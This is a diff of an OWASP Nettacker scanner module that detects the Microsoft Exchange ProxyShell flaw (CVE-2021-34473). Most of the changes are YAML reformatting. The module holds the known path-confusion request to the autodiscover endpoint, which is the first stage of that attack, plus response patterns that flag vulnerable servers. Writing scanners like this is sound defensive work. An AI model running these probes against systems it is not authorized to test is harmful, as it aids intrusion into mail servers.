@@ -2,47 +2,47 @@ info:
   name: msexchange_cve_2021_34473_vuln
   author: OWASP Nettacker Team
   severity: 9
-  description: Microsoft Exchange Server Remote Code Execution Vulnerability This CVE ID is unique from CVE-2021-31196, CVE-2021-31206.
+  description: Microsoft Exchange Server Remote Code Execution Vulnerability This
+    CVE ID is unique from CVE-2021-31196, CVE-2021-31206.
   reference:
-    - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34473
-    - https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html
+  - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34473
+  - https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html
   profiles:
-    - vuln
-    - http
-    - critical_severity
-    - msexchange
-    - cve
-    - cve2021
-    - rce
-
+  - vuln
+  - http
+  - critical_severity
+  - msexchange
+  - rce
+  - cve_2021
 payloads:
-  - library: http
-    steps:
-      - method: get
-        timeout: 3
-        allow_redirects: false
-        headers:
-          User-Agent: "{user_agent}"
-        ssl: false
-        url:
-          nettacker_fuzzer:
-            input_format: "{{schema}}://{target}:{{ports}}/{{paths}}"
-            prefix: ""
-            suffix: ""
-            interceptors:
-            data:
-              paths:
-                - 'autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com'
-                - 'autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com'
-              schema:
-                - "http"
-                - "https"
-              ports:
-                - 80
-                - 443
-        response:
-          condition_type: and
-          conditions:
-            content:
-              regex: Microsoft.Exchange.Clients.Owa2.Server.Core.OwaADUserNotFoundException|Exchange MAPI\/HTTP Connectivity Endpoint
-              reverse: false
+- library: http
+  steps:
+  - method: get
+    timeout: 3
+    allow_redirects: false
+    headers:
+      User-Agent: '{user_agent}'
+    ssl: false
+    url:
+      nettacker_fuzzer:
+        input_format: '{{schema}}://{target}:{{ports}}/{{paths}}'
+        prefix: ''
+        suffix: ''
+        interceptors: null
+        data:
+          paths:
+          - autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com
+          - autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com
+          schema:
+          - http
+          - https
+          ports:
+          - 80
+          - 443
+    response:
+      condition_type: and
+      conditions:
+        content:
+          regex: Microsoft.Exchange.Clients.Owa2.Server.Core.OwaADUserNotFoundException|Exchange
+            MAPI\/HTTP Connectivity Endpoint
+          reverse: false
